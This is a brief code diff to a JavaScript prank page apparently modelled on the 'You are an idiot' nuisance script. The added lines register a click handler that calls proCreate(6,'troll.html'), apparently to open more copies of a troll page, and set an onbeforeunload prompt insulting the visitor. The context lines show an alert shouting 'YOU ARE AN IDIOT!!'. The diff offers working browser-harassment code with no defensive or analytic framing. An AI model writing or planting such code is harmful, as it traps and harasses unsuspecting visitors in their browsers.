@@ -8,6 +8,10 @@ window.onkeydown = async () => {
 	
 	return null;
 }
+container.addEventListener('click', async () => {
+	await proCreate(6,"troll.html");
+	window.onbeforeunload = () => "Are you an idiot?";
+});
 window.onload = playBall;
 
 alert("YOU ARE AN IDIOT!! HGAHAHAHA");
